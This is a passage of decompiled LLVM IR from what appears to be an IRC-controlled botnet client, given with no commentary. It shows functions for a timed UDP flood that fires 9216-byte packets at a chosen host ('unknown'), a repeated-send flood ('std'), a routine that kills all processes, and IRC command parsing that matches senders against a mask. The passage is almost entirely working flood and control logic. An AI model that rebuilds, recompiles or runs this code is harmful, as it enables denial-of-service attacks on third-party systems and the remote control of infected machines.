  uselistorder label %dec_label_pc_8048819, { 1, 0 }
  uselistorder label %dec_label_pc_80487a4, { 1, 0 }
}

define i32 @std(i32 %arg1, i32 %arg2, i32 %arg3) local_unnamed_addr {
entry:
  %stack_var_-36 = alloca i32, align 4
  %stack_var_-40 = alloca i32, align 4
  %v4_8048920 = add i32 %arg2, -2
  %v9_8048920 = sub i32 1, %arg2
  %v10_8048920 = and i32 %v9_8048920, %arg2
  %v11_8048920 = icmp slt i32 %v10_8048920, 0
  %v12_8048920 = icmp eq i32 %v4_8048920, 0
  %v13_8048920 = icmp slt i32 %v4_8048920, 0
  %v3_8048924 = icmp eq i1 %v13_8048920, %v11_8048920
  %v4_8048924 = icmp eq i1 %v12_8048920, false
  %v5_8048924 = and i1 %v4_8048924, %v3_8048924
  br i1 %v5_8048924, label %entry.dec_label_pc_8048930_crit_edge, label %dec_label_pc_8048926

entry.dec_label_pc_8048930_crit_edge:             ; preds = %entry
  br label %dec_label_pc_8048930

dec_label_pc_8048926:                             ; preds = %entry
  %v1_804892b = call i32 @__GI_exit(i32 1)
  br label %dec_label_pc_8048930

dec_label_pc_8048930:                             ; preds = %entry.dec_label_pc_8048930_crit_edge, %dec_label_pc_8048926
  %v4_8048939 = call i32 @socket(i32 2, i32 2, i32 0)
  %v2_8048949 = call i32 @__GI_time(i32* null)
  %v1_8048957 = add i32 %arg3, 12
  %v1_804895a = inttoptr i32 %v1_8048957 to i32*
  %v2_804895a = load i32, i32* %v1_804895a, align 4
  %v1_8048960 = call i32 @atol(i32 %v2_804895a)
  store i32 %v1_8048960, i32* @eax, align 4
  %v1_8048971 = call i32 @mfork(i32 %arg1)
  %v1_8048979 = icmp eq i32 %v1_8048971, 0
  %v1_804897b = icmp eq i1 %v1_8048979, false
  br i1 %v1_804897b, label %dec_label_pc_8048a6e, label %dec_label_pc_8048981

dec_label_pc_8048981:                             ; preds = %dec_label_pc_8048930
  %v1_8048984 = add i32 %arg3, 4
  %v1_8048987 = inttoptr i32 %v1_8048984 to i32*
  %v2_8048987 = load i32, i32* %v1_8048987, align 4
  %v1_804898d = call i32 @__GI_gethostbyname(i32 %v2_8048987)
  %v2_8048998 = ptrtoint i32* %stack_var_-40 to i32
  store i32 0, i32* %stack_var_-40, align 4
  store i32 0, i32* %stack_var_-36, align 4
  %v1_80489b9 = add i32 %v1_804898d, 12
  %v2_80489b9 = inttoptr i32 %v1_80489b9 to i32*
  %v3_80489b9 = load i32, i32* %v2_80489b9, align 4
  %v2_80489c1 = ptrtoint i32* %stack_var_-36 to i32
  %v1_80489c7 = add i32 %v1_804898d, 16
  %v2_80489c7 = inttoptr i32 %v1_80489c7 to i32*
  %v3_80489c7 = load i32, i32* %v2_80489c7, align 4
  %v1_80489ca = inttoptr i32 %v3_80489c7 to i32*
  %v2_80489ca = load i32, i32* %v1_80489ca, align 4
  %v4_80489d2 = call i32 @bcopy(i32 %v2_80489ca, i32 %v2_80489c1, i32 %v3_80489b9)
  %v1_80489dd = add i32 %v1_804898d, 8
  %v2_80489dd = inttoptr i32 %v1_80489dd to i32*
  %v3_80489dd = load i32, i32* %v2_80489dd, align 4
  store i32 %v3_80489dd, i32* %stack_var_-40, align 4
  %v1_80489e7 = add i32 %arg3, 8
  %v1_80489ea = inttoptr i32 %v1_80489e7 to i32*
  %v2_80489ea = load i32, i32* %v1_80489ea, align 4
  %v1_80489f0 = call i32 @atol(i32 %v2_80489ea)
  %v5_8048a43 = add i32 %v1_8048960, %v2_8048949
  br label %dec_label_pc_8048a03

dec_label_pc_8048a03:                             ; preds = %dec_label_pc_8048a69, %dec_label_pc_8048981
  %storemerge = phi i32 [ %v4_8048a69, %dec_label_pc_8048a69 ], [ 0, %dec_label_pc_8048981 ]
  %tmp29 = icmp ult i32 %storemerge, 50
  br i1 %tmp29, label %dec_label_pc_8048a69, label %dec_label_pc_8048a09

dec_label_pc_8048a09:                             ; preds = %dec_label_pc_8048a03
  %v5_8048a15 = call i32 @__libc_send(i32 %v4_8048939, i32 ptrtoint ([4 x i8]* @global_var_805113b.262 to i32), i32 50, i32 0)
  %v4_8048a29 = call i32 @__libc_connect(i32 %v4_8048939, i32 %v2_8048998, i32 16)
  %v2_8048a36 = call i32 @__GI_time(i32* null)
  %v7_8048a46 = icmp ult i32 %v2_8048a36, %v5_8048a43
  br i1 %v7_8048a46, label %dec_label_pc_8048a69, label %dec_label_pc_8048a4a

dec_label_pc_8048a4a:                             ; preds = %dec_label_pc_8048a09
  %v1_8048a50 = call i32 @__libc_close(i32 %v4_8048939)
  store i32 %v1_8048a50, i32* @eax, align 4
  %v1_8048a5d = call i32 @__GI_exit(i32 0)
  br label %dec_label_pc_8048a69

dec_label_pc_8048a69:                             ; preds = %dec_label_pc_8048a4a, %dec_label_pc_8048a09, %dec_label_pc_8048a03
  %stack_var_-8.0 = phi i32 [ %storemerge, %dec_label_pc_8048a03 ], [ 0, %dec_label_pc_8048a09 ], [ 0, %dec_label_pc_8048a4a ]
  %v4_8048a69 = add i32 %stack_var_-8.0, 1
  br label %dec_label_pc_8048a03

dec_label_pc_8048a6e:                             ; preds = %dec_label_pc_8048930
  ret i32 %v1_8048971

; uselistorder directives
  uselistorder i32 %storemerge, { 1, 0 }
  uselistorder i32 %v4_8048920, { 1, 0 }
  uselistorder i32* %stack_var_-36, { 1, 0 }
  uselistorder i32 %arg3, { 2, 1, 0 }
  uselistorder label %dec_label_pc_8048930, { 1, 0 }
}

define i32 @stop(i32 %arg1, i32 %arg2) local_unnamed_addr {
entry:
  %stack_var_-4 = alloca i32, align 4
  %v0_8048a70 = load i32, i32* @ebp, align 4
  store i32 %v0_8048a70, i32* %stack_var_-4, align 4
  %v4_8048a70 = ptrtoint i32* %stack_var_-4 to i32
  store i32 %v4_8048a70, i32* @ebp, align 4
  %v4_8048ab4 = icmp eq i32 %arg2, 0
  %v0_8048b0714 = load i32, i32* @global_var_8054390.256, align 16
  %v10_8048b0c15 = icmp eq i32 %v0_8048b0714, 0
  br i1 %v10_8048b0c15, label %dec_label_pc_8048b15, label %dec_label_pc_8048a83

dec_label_pc_8048a83:                             ; preds = %entry, %dec_label_pc_8048b04
  %storemerge17 = phi i32 [ %v4_8048b04, %dec_label_pc_8048b04 ], [ 0, %entry ]
  %v2_8048a86 = mul i32 %storemerge17, 4
  %v0_8048a8b = load i32, i32* @global_var_8056a2c.257, align 4
  %v2_8048a90 = add i32 %v0_8048a8b, %v2_8048a86
  %v1_8048a93 = inttoptr i32 %v2_8048a90 to i32*
  %v2_8048a93 = load i32, i32* %v1_8048a93, align 4
  %v1_8048a95 = icmp eq i32 %v2_8048a93, 0
  br i1 %v1_8048a95, label %dec_label_pc_8048b04, label %dec_label_pc_8048a99

dec_label_pc_8048a99:                             ; preds = %dec_label_pc_8048a83
  %v2_8048aa9 = load i32, i32* %v1_8048a93, align 4
  store i32 %v2_8048aa9, i32* @ebx, align 4
  %v0_8048aab = call i32 @__libc_getpid()
  %v0_8048ab0 = load i32, i32* @ebx, align 4
  %v12_8048ab0 = icmp eq i32 %v0_8048ab0, %v0_8048aab
  br i1 %v12_8048ab0, label %dec_label_pc_8048b04, label %dec_label_pc_8048ab4

dec_label_pc_8048ab4:                             ; preds = %dec_label_pc_8048a99
  br i1 %v4_8048ab4, label %dec_label_pc_8048ab4.dec_label_pc_8048ae4_crit_edge, label %dec_label_pc_8048aba

dec_label_pc_8048ab4.dec_label_pc_8048ae4_crit_edge: ; preds = %dec_label_pc_8048ab4
  br label %dec_label_pc_8048ae4

dec_label_pc_8048aba:                             ; preds = %dec_label_pc_8048ab4
  %v0_8048acc = load i32, i32* @global_var_8056a28.263, align 8
  %v4_8048adc = call i32 @Send(i32 %arg1, i32 ptrtoint ([29 x i8]* @global_var_805113f.264 to i32), i32 %v0_8048acc)
  br label %dec_label_pc_8048ae4

dec_label_pc_8048ae4:                             ; preds = %dec_label_pc_8048ab4.dec_label_pc_8048ae4_crit_edge, %dec_label_pc_8048aba
  %v0_8048aec = load i32, i32* @global_var_8056a2c.257, align 4
  %v2_8048af1 = add i32 %v0_8048aec, %v2_8048a86
  %v1_8048af4 = inttoptr i32 %v2_8048af1 to i32*
  %v2_8048af4 = load i32, i32* %v1_8048af4, align 4
  %v3_8048afc = call i32 @kill(i32 %v2_8048af4, i32 9)
  br label %dec_label_pc_8048b04

dec_label_pc_8048b04:                             ; preds = %dec_label_pc_8048a99, %dec_label_pc_8048a83, %dec_label_pc_8048ae4
  %v4_8048b04 = add i32 %storemerge17, 1
  %v0_8048b07 = load i32, i32* @global_var_8054390.256, align 16
  %v10_8048b0c = icmp ult i32 %v4_8048b04, %v0_8048b07
  br i1 %v10_8048b0c, label %dec_label_pc_8048a83, label %dec_label_pc_8048b07.dec_label_pc_8048b15_crit_edge

dec_label_pc_8048b07.dec_label_pc_8048b15_crit_edge: ; preds = %dec_label_pc_8048b04
  br label %dec_label_pc_8048b15

dec_label_pc_8048b15:                             ; preds = %entry, %dec_label_pc_8048b07.dec_label_pc_8048b15_crit_edge
  %v0_8048b07.lcssa = phi i32 [ %v0_8048b07, %dec_label_pc_8048b07.dec_label_pc_8048b15_crit_edge ], [ 0, %entry ]
  ret i32 %v0_8048b07.lcssa

; uselistorder directives
  uselistorder i32 %v4_8048b04, { 1, 0 }
  uselistorder i32 %v2_8048a86, { 1, 0 }
  uselistorder i32 %storemerge17, { 1, 0 }
  uselistorder i32* %stack_var_-4, { 1, 0 }
  uselistorder label %dec_label_pc_8048b15, { 1, 0 }
  uselistorder label %dec_label_pc_8048b04, { 2, 0, 1 }
  uselistorder label %dec_label_pc_8048ae4, { 1, 0 }
  uselistorder label %dec_label_pc_8048a83, { 1, 0 }
}

define i32 @unknown(i32 %arg1, i32 %arg2, i32 %arg3, i32 %arg4) local_unnamed_addr {
entry:
  %tmp = call i32 @__decompiler_undefined_function_0()
  %stack_var_-32 = alloca i32, align 4
  %stack_var_-48 = alloca i32, align 4
  store i32 1, i32* %stack_var_-32, align 4
  %v1_8048b2f = call i32 @malloc(i32 9216)
  %v2_8048b3f = call i32 @__GI_time(i32* null)
  store i32 %v2_8048b3f, i32* @eax, align 4
  %v1_8048b50 = call i32 @mfork(i32 %arg2)
  store i32 %v1_8048b50, i32* @eax, align 4
  %v1_8048b58 = icmp eq i32 %v1_8048b50, 0
  %v1_8048b5a = icmp eq i1 %v1_8048b58, false
  br i1 %v1_8048b5a, label %dec_label_pc_8048c98, label %dec_label_pc_8048b60

dec_label_pc_8048b60:                             ; preds = %entry
  %v12_8048b60 = icmp eq i32 %arg3, 2
  br i1 %v12_8048b60, label %dec_label_pc_8048b70, label %dec_label_pc_8048b66

dec_label_pc_8048b66:                             ; preds = %dec_label_pc_8048b60
  %v1_8048b6b = call i32 @__GI_exit(i32 1)
  br label %dec_label_pc_8048b70

dec_label_pc_8048b70:                             ; preds = %dec_label_pc_8048b60, %dec_label_pc_8048b66
  %v1_8048b73 = add i32 %arg4, 8
  %v1_8048b76 = inttoptr i32 %v1_8048b73 to i32*
  %v2_8048b76 = load i32, i32* %v1_8048b76, align 4
  %v1_8048b7c = call i32 @atol(i32 %v2_8048b76)
  %v2_8048b87 = ptrtoint i32* %stack_var_-48 to i32
  store i32 0, i32* %stack_var_-48, align 4
  %v1_8048ba8 = add i32 %arg4, 4
  %v1_8048bab = inttoptr i32 %v1_8048ba8 to i32*
  %v2_8048bab = load i32, i32* %v1_8048bab, align 4
  %v3_8048bb4 = call i32 @host2ip(i32 %arg2, i32 %v2_8048bab)
  store i32 2, i32* %stack_var_-48, align 4
  %v0_8048bcd = load i32, i32* @global_var_8056a28.263, align 8
  %v4_8048bdd = call i32 @Send(i32 %arg1, i32 ptrtoint ([30 x i8]* @global_var_805115c.265 to i32), i32 %v0_8048bcd)
  store i32 %v4_8048bdd, i32* @eax, align 4
  %v5_8048c6a = add i32 %v1_8048b7c, %v2_8048b3f
  %v2_8048c12 = ptrtoint i32* %stack_var_-32 to i32
  br label %dec_label_pc_8048be5

dec_label_pc_8048be5:                             ; preds = %dec_label_pc_8048c78, %dec_label_pc_8048b70
  %stack_var_-24.0 = phi i32 [ %tmp, %dec_label_pc_8048b70 ], [ %v4_8048c78, %dec_label_pc_8048c78 ]
  %v0_8048be5 = call i32 @random()
  %v4_8048bf7 = call i32 @socket(i32 2, i32 2, i32 17)
  store i32 %v4_8048bf7, i32* @eax, align 4
  %v5_8048c02 = icmp slt i32 %v4_8048bf7, 0
  br i1 %v5_8048c02, label %dec_label_pc_8048c52, label %dec_label_pc_8048c08

dec_label_pc_8048c08:                             ; preds = %dec_label_pc_8048be5
  store i32 1, i32* %stack_var_-32, align 4
  %v4_8048c1e = call i32 @ioctl(i32 %v4_8048bf7, i32 21537, i32 %v2_8048c12)
  %v7_8048c3c = call i32 @__libc_sendto(i32 %v4_8048bf7, i32 %v1_8048b2f, i32 9216, i32 0, i32 %v2_8048b87, i32 16)
  %v1_8048c4a = call i32 @__libc_close(i32 %v4_8048bf7)
  store i32 %v1_8048c4a, i32* @eax, align 4
  br label %dec_label_pc_8048c52

dec_label_pc_8048c52:                             ; preds = %dec_label_pc_8048be5, %dec_label_pc_8048c08
  %v7_8048c56 = icmp sgt i32 %stack_var_-24.0, 49
  br i1 %v7_8048c56, label %dec_label_pc_8048c58, label %dec_label_pc_8048c78

dec_label_pc_8048c58:                             ; preds = %dec_label_pc_8048c52
  %v2_8048c5d = call i32 @__GI_time(i32* null)
  store i32 %v5_8048c6a, i32* @eax, align 4
  %v7_8048c6d = icmp ult i32 %v2_8048c5d, %v5_8048c6a
  %v1_8048c6f = icmp eq i1 %v7_8048c6d, false
  br i1 %v1_8048c6f, label %dec_label_pc_8048c80, label %dec_label_pc_8048c78

dec_label_pc_8048c78:                             ; preds = %dec_label_pc_8048c58, %dec_label_pc_8048c52
  %stack_var_-24.1 = phi i32 [ %stack_var_-24.0, %dec_label_pc_8048c52 ], [ 0, %dec_label_pc_8048c58 ]
  %v4_8048c78 = add i32 %stack_var_-24.1, 1
  br label %dec_label_pc_8048be5

dec_label_pc_8048c80:                             ; preds = %dec_label_pc_8048c58
  %v1_8048c86 = call i32 @__libc_close(i32 %v4_8048bf7)
  store i32 %v1_8048c86, i32* @eax, align 4
  %v1_8048c93 = call i32 @__GI_exit(i32 0)
  br label %dec_label_pc_8048c98

dec_label_pc_8048c98:                             ; preds = %entry, %dec_label_pc_8048c80
  %v0_8048c99 = phi i32 [ %v1_8048b50, %entry ], [ %v1_8048c93, %dec_label_pc_8048c80 ]
  ret i32 %v0_8048c99

; uselistorder directives
  uselistorder i32* %stack_var_-32, { 0, 2, 1 }
  uselistorder i32 (i32)* @atol, { 2, 1, 0 }
  uselistorder i32 (i32)* @mfork, { 1, 0 }
  uselistorder i32 %arg4, { 1, 0 }
  uselistorder i32 %arg2, { 1, 0 }
  uselistorder label %dec_label_pc_8048c98, { 1, 0 }
  uselistorder label %dec_label_pc_8048c52, { 1, 0 }
  uselistorder label %dec_label_pc_8048b70, { 1, 0 }
}

define i32 @killsec(i32 %arg1) local_unnamed_addr {
entry:
  %v0_8048ca0 = load i32, i32* bitcast ([6 x i8]** @global_var_8054024.267 to i32*), align 4
  %v5_8048cab = inttoptr i32 %v0_8048ca0 to i8*
  %v4_8048cac = call i32 @__GI_strcasecmp(i8* %v5_8048cab, i32 %arg1)
  %v1_8048cb4 = icmp eq i32 %v4_8048cac, 0
  %v1_8048cb6 = icmp eq i1 %v1_8048cb4, false
  br i1 %v1_8048cb6, label %dec_label_pc_8048cc7, label %dec_label_pc_8048cb8

dec_label_pc_8048cb8:                             ; preds = %entry
  %v3_8048cbf = call i32 @kill(i32 0, i32 9)
  br label %dec_label_pc_8048cc7

dec_label_pc_8048cc7:                             ; preds = %entry, %dec_label_pc_8048cb8
  %v0_8048cc8 = phi i32 [ %v4_8048cac, %entry ], [ %v3_8048cbf, %dec_label_pc_8048cb8 ]
  ret i32 %v0_8048cc8

; uselistorder directives
  uselistorder label %dec_label_pc_8048cc7, { 1, 0 }
}

define i32 @_PRIVMSG(i32 %arg1, i8* %arg2, i32 %arg3) local_unnamed_addr {
entry:
  %tmp60 = inttoptr i32 %arg3 to i8*
  %stack_var_-1104 = alloca i32, align 4
  br label %dec_label_pc_8048ce0

dec_label_pc_8048cdd:                             ; preds = %dec_label_pc_8048d05
  %v4_8048cdd = add i32 %storemerge12, 1
  br label %dec_label_pc_8048ce0

dec_label_pc_8048ce0:                             ; preds = %entry, %dec_label_pc_8048cdd
  %storemerge12 = phi i32 [ %v4_8048cdd, %dec_label_pc_8048cdd ], [ 0, %entry ]
  %v3_8048cfa = call i32 @_strlen(i8* %tmp60)
  %v7_8048d01 = icmp ult i32 %storemerge12, %v3_8048cfa
  %v1_8048d03 = icmp eq i1 %v7_8048d01, false
  %.pre = add i32 %storemerge12, %arg3
  br i1 %v1_8048d03, label %dec_label_pc_8048ce0.dec_label_pc_8048d11_crit_edge, label %dec_label_pc_8048d05

dec_label_pc_8048ce0.dec_label_pc_8048d11_crit_edge: ; preds = %dec_label_pc_8048ce0
  %.pre21 = inttoptr i32 %.pre to i8*
  br label %dec_label_pc_8048d11

dec_label_pc_8048d05:                             ; preds = %dec_label_pc_8048ce0
  %v1_8048d0b = inttoptr i32 %.pre to i8*
  %v2_8048d0b = load i8, i8* %v1_8048d0b, align 1
  %v7_8048d0d = icmp eq i8 %v2_8048d0b, 32
  %v1_8048d0f = icmp eq i1 %v7_8048d0d, false
  br i1 %v1_8048d0f, label %dec_label_pc_8048cdd, label %dec_label_pc_8048d11

dec_label_pc_8048d11:                             ; preds = %dec_label_pc_8048d05, %dec_label_pc_8048ce0.dec_label_pc_8048d11_crit_edge
  %v1_8048d17.pre-phi = phi i8* [ %.pre21, %dec_label_pc_8048ce0.dec_label_pc_8048d11_crit_edge ], [ %v1_8048d0b, %dec_label_pc_8048d05 ]
  store i8 0, i8* %v1_8048d17.pre-phi, align 1
  %v1_8048d26 = add i32 %.pre, 2
  %v5_8048d29 = inttoptr i32 %v1_8048d26 to i8*
  %v4_8048d3b = ptrtoint i8* %arg2 to i32
  br label %dec_label_pc_8048d38

dec_label_pc_8048d35:                             ; preds = %dec_label_pc_8048d5d
  %v4_8048d35 = add i32 %storemerge11, 1
  br label %dec_label_pc_8048d38

dec_label_pc_8048d38:                             ; preds = %dec_label_pc_8048d11, %dec_label_pc_8048d35
  %storemerge11 = phi i32 [ %v4_8048d35, %dec_label_pc_8048d35 ], [ 0, %dec_label_pc_8048d11 ]
  store i32 %v4_8048d3b, i32* @edi, align 4
  %v3_8048d52 = call i32 @_strlen(i8* %arg2)
  %v7_8048d59 = icmp ult i32 %storemerge11, %v3_8048d52
  %v1_8048d5b = icmp eq i1 %v7_8048d59, false
  %.pre22 = add i32 %storemerge11, %v4_8048d3b
  br i1 %v1_8048d5b, label %dec_label_pc_8048d38.dec_label_pc_8048d69_crit_edge, label %dec_label_pc_8048d5d

dec_label_pc_8048d38.dec_label_pc_8048d69_crit_edge: ; preds = %dec_label_pc_8048d38
  %.pre29 = inttoptr i32 %.pre22 to i8*
  br label %dec_label_pc_8048d69

dec_label_pc_8048d5d:                             ; preds = %dec_label_pc_8048d38
  %v1_8048d63 = inttoptr i32 %.pre22 to i8*
  %v2_8048d63 = load i8, i8* %v1_8048d63, align 1
  %v10_8048d65 = icmp eq i8 %v2_8048d63, 33
  %v1_8048d67 = icmp eq i1 %v10_8048d65, false
  br i1 %v1_8048d67, label %dec_label_pc_8048d35, label %dec_label_pc_8048d69

dec_label_pc_8048d69:                             ; preds = %dec_label_pc_8048d5d, %dec_label_pc_8048d38.dec_label_pc_8048d69_crit_edge
  %v1_8048d6f.pre-phi = phi i8* [ %.pre29, %dec_label_pc_8048d38.dec_label_pc_8048d69_crit_edge ], [ %v1_8048d63, %dec_label_pc_8048d5d ]
  store i8 0, i8* %v1_8048d6f.pre-phi, align 1
  %v2_8048d75 = load i8, i8* %v5_8048d29, align 1
  %v3_8048d75 = zext i8 %v2_8048d75 to i32
  %v5_8048d75 = and i32 %v1_8048d26, -256
  %v6_8048d75 = or i32 %v3_8048d75, %v5_8048d75
  %v10_8048d77 = icmp eq i8 %v2_8048d75, 33
  %v1_8048d79 = icmp eq i1 %v10_8048d77, false
  br i1 %v1_8048d79, label %dec_label_pc_804901b, label %dec_label_pc_8048d7f

dec_label_pc_8048d7f:                             ; preds = %dec_label_pc_8048d69
  %v0_8048d7f = load i32, i32* @global_var_8056a28.263, align 8
  %v3_8048d8b = call i32 @__GI_strcasecmp(i8* %tmp60, i32 %v0_8048d7f)
  %v1_8048d93 = icmp eq i32 %v3_8048d8b, 0
  %v1_8048d95 = icmp eq i1 %v1_8048d93, false
  br i1 %v1_8048d95, label %dec_label_pc_804901b, label %dec_label_pc_8048d9b

dec_label_pc_8048d9b:                             ; preds = %dec_label_pc_8048d7f
  %v2_8048d9b = ptrtoint i32* %stack_var_-1104 to i32
  %v3_8048dad = bitcast i32* %stack_var_-1104 to i8*
  %v4_8048dad = call i32 @__GI_memset(i8* %v3_8048dad, i32 0, i32 1024)
  %v5_8048dbc = add i32 %.pre, 3
  %v22_8048dbc = inttoptr i32 %v5_8048dbc to i8*
  br label %dec_label_pc_8048dcb

dec_label_pc_8048dc8:                             ; preds = %dec_label_pc_8048df0
  %v4_8048dc8 = add i32 %storemerge10, 1
  br label %dec_label_pc_8048dcb

dec_label_pc_8048dcb:                             ; preds = %dec_label_pc_8048d9b, %dec_label_pc_8048dc8
  %storemerge10 = phi i32 [ %v4_8048dc8, %dec_label_pc_8048dc8 ], [ 0, %dec_label_pc_8048d9b ]
  %v3_8048de5 = call i32 @_strlen(i8* %v22_8048dbc)
  %v7_8048dec = icmp ult i32 %storemerge10, %v3_8048de5
  %v1_8048dee = icmp eq i1 %v7_8048dec, false
  %.pre30 = add i32 %storemerge10, %v5_8048dbc
  br i1 %v1_8048dee, label %dec_label_pc_8048dcb.dec_label_pc_8048dfc_crit_edge, label %dec_label_pc_8048df0

dec_label_pc_8048dcb.dec_label_pc_8048dfc_crit_edge: ; preds = %dec_label_pc_8048dcb
  %.pre37 = inttoptr i32 %.pre30 to i8*
  br label %dec_label_pc_8048dfc

dec_label_pc_8048df0:                             ; preds = %dec_label_pc_8048dcb
  %v1_8048df6 = inttoptr i32 %.pre30 to i8*
  %v2_8048df6 = load i8, i8* %v1_8048df6, align 1
  %v7_8048df8 = icmp eq i8 %v2_8048df6, 32
  %v1_8048dfa = icmp eq i1 %v7_8048df8, false
  br i1 %v1_8048dfa, label %dec_label_pc_8048dc8, label %dec_label_pc_8048dfc

dec_label_pc_8048dfc:                             ; preds = %dec_label_pc_8048df0, %dec_label_pc_8048dcb.dec_label_pc_8048dfc_crit_edge
  %v1_8048e02.pre-phi = phi i8* [ %.pre37, %dec_label_pc_8048dcb.dec_label_pc_8048dfc_crit_edge ], [ %v1_8048df6, %dec_label_pc_8048df0 ]
  store i8 0, i8* %v1_8048e02.pre-phi, align 1
  %v0_8048e05 = load i32, i32* @global_var_8056a10.268, align 16
  %v3_8048e12 = call i32 @strwildmatch(i8* %v22_8048dbc, i32 %v0_8048e05)
  %v1_8048e1a = icmp eq i32 %v3_8048e12, 0
  %v1_8048e1c = icmp eq i1 %v1_8048e1a, false
  br i1 %v1_8048e1c, label %dec_label_pc_804901b, label %dec_label_pc_8048e22

dec_label_pc_8048e22:                             ; preds = %dec_label_pc_8048dfc
  %v1_8048e28 = add i32 %.pre30, 1
  %v5_8048e29 = inttoptr i32 %v1_8048e28 to i8*
  %v3_8048e43 = call i32 @_strlen(i8* %v5_8048e29)
  %v5_8048e83108 = icmp sgt i32 %v3_8048e43, 0
  br i1 %v5_8048e83108, label %dec_label_pc_8048e56, label %dec_label_pc_8048e7d.dec_label_pc_8048ea0.preheader_crit_edge

dec_label_pc_8048e56:                             ; preds = %dec_label_pc_8048e22, %dec_label_pc_8048e68
  %v4_8048e56112 = phi i32 [ %v5_8048e77, %dec_label_pc_8048e68 ], [ %v1_8048e28, %dec_label_pc_8048e22 ]
  %storemerge9111 = phi i32 [ %v4_8048e7a, %dec_label_pc_8048e68 ], [ 0, %dec_label_pc_8048e22 ]
  %stack_var_-24.0110 = phi i8* [ %v22_8048e77, %dec_label_pc_8048e68 ], [ %v5_8048e29, %dec_label_pc_8048e22 ]
  %v2_8048e59 = load i8, i8* %stack_var_-24.0110, align 1
  %v7_8048e5b = icmp eq i8 %v2_8048e59, 32
  br i1 %v7_8048e5b, label %dec_label_pc_8048ea0.preheader, label %dec_label_pc_8048e5f

dec_label_pc_8048e5f:                             ; preds = %dec_label_pc_8048e56
  %v2_8048e62 = load i8, i8* %stack_var_-24.0110, align 1
  %v4_8048e64 = icmp eq i8 %v2_8048e62, 0
  br i1 %v4_8048e64, label %dec_label_pc_8048ea0.preheader, label %dec_label_pc_8048e68

dec_label_pc_8048e68:                             ; preds = %dec_label_pc_8048e5f
  %v2_8048e6e = load i8, i8* %stack_var_-24.0110, align 1
  %v2_8048e70 = load i32, i32* @ebp, align 4
  %v4_8048e70 = add nsw i32 %storemerge9111, -1100
  %v5_8048e70 = add i32 %v4_8048e70, %v2_8048e70
  %v6_8048e70 = inttoptr i32 %v5_8048e70 to i8*
  store i8 %v2_8048e6e, i8* %v6_8048e70, align 1
  %v5_8048e77 = add i32 %v4_8048e56112, 1
  %v22_8048e77 = inttoptr i32 %v5_8048e77 to i8*
  %v4_8048e7a = add nuw nsw i32 %storemerge9111, 1
  %v5_8048e83 = icmp slt i32 %v4_8048e7a, %v3_8048e43
  br i1 %v5_8048e83, label %dec_label_pc_8048e56, label %dec_label_pc_8048e7d.dec_label_pc_8048ea0.preheader_crit_edge

dec_label_pc_8048e7d.dec_label_pc_8048ea0.preheader_crit_edge: ; preds = %dec_label_pc_8048e68, %dec_label_pc_8048e22
  %stack_var_-24.0.lcssa = phi i8* [ %v5_8048e29, %dec_label_pc_8048e22 ], [ %v22_8048e77, %dec_label_pc_8048e68 ]
  %v4_8048e56.lcssa = phi i32 [ %v1_8048e28, %dec_label_pc_8048e22 ], [ %v5_8048e77, %dec_label_pc_8048e68 ]
  br label %dec_label_pc_8048ea0.preheader

dec_label_pc_8048ea0.preheader:                   ; preds = %dec_label_pc_8048e5f, %dec_label_pc_8048e56, %dec_label_pc_8048e7d.dec_label_pc_8048ea0.preheader_crit_edge
  %stack_var_-24.082 = phi i8* [ %stack_var_-24.0.lcssa, %dec_label_pc_8048e7d.dec_label_pc_8048ea0.preheader_crit_edge ], [ %stack_var_-24.0110, %dec_label_pc_8048e56 ], [ %stack_var_-24.0110, %dec_label_pc_8048e5f ]
  %v4_8048e5680 = phi i32 [ %v4_8048e56.lcssa, %dec_label_pc_8048e7d.dec_label_pc_8048ea0.preheader_crit_edge ], [ %v4_8048e56112, %dec_label_pc_8048e56 ], [ %v4_8048e56112, %dec_label_pc_8048e5f ]
  br label %dec_label_pc_8048ea0

dec_label_pc_8048e8e:                             ; preds = %dec_label_pc_8048ea0
  %v6_8048e91 = add i32 %storemerge8, %v4_8048e5680
  %v1_8048e94 = inttoptr i32 %v6_8048e91 to i8*
  %v2_8048e94 = load i8, i8* %v1_8048e94, align 1
  %v7_8048e96 = icmp eq i8 %v2_8048e94, 32
  %v4_8048e9a = zext i1 %v7_8048e96 to i32
  %stack_var_-20.1.v4_8048e9a = add i32 %v4_8048e9a, %stack_var_-20.1
  %v4_8048e9d = add i32 %storemerge8, 1
  br label %dec_label_pc_8048ea0

dec_label_pc_8048ea0:                             ; preds = %dec_label_pc_8048ea0.preheader, %dec_label_pc_8048e8e
  %stack_var_-20.1 = phi i32 [ %stack_var_-20.1.v4_8048e9a, %dec_label_pc_8048e8e ], [ 0, %dec_label_pc_8048ea0.preheader ]
  %storemerge8 = phi i32 [ %v4_8048e9d, %dec_label_pc_8048e8e ], [ 0, %dec_label_pc_8048ea0.preheader ]
  store i1 false, i1* @df, align 1
  store i32 %v4_8048e5680, i32* @edi, align 4
  %v3_8048eba = call i32 @_strlen(i8* %stack_var_-24.082)
  %v7_8048ec1 = icmp ult i32 %storemerge8, %v3_8048eba
  br i1 %v7_8048ec1, label %dec_label_pc_8048e8e, label %dec_label_pc_8048ec5

dec_label_pc_8048ec5:                             ; preds = %dec_label_pc_8048ea0
  %v4_8048ec5 = add i32 %stack_var_-20.1, 1
  %v7_8048ecc = icmp sgt i32 %v4_8048ec5, 10
  %.v4_8048ec5 = select i1 %v7_8048ecc, i32 10, i32 %v4_8048ec5
  %v0_8048ee2 = load i32, i32* @ebp, align 4
  %tmp = mul i32 %.v4_8048ec5, 4
  %v3_8048ee2 = add i32 %tmp, -72
  %v4_8048ee2 = add i32 %v3_8048ee2, %v0_8048ee2
  %v5_8048ee2 = inttoptr i32 %v4_8048ee2 to i32*
  store i32 ptrtoint (i32* @global_var_80511be.269 to i32), i32* %v5_8048ee2, align 4
  %v2_8048f8f98 = load i8, i8* %stack_var_-24.082, align 1
  %v4_8048f91102 = icmp eq i8 %v2_8048f8f98, 0
  %v1_8048f93103 = icmp eq i1 %v4_8048f91102, false
  br i1 %v1_8048f93103, label %dec_label_pc_8048ef6, label %dec_label_pc_8048f99

dec_label_pc_8048ef6:                             ; preds = %dec_label_pc_8048ec5, %dec_label_pc_8048f42
  %v4_8048f8c105.in = phi i8* [ %v26_8048f89.pre-phi, %dec_label_pc_8048f42 ], [ %stack_var_-24.082, %dec_label_pc_8048ec5 ]
  %stack_var_-16.0104 = phi i32 [ %v4_8048f83, %dec_label_pc_8048f42 ], [ 1, %dec_label_pc_8048ec5 ]
  %v4_8048f8c105 = ptrtoint i8* %v4_8048f8c105.in to i32
  %v5_8048ef6 = add i32 %v4_8048f8c105, 1
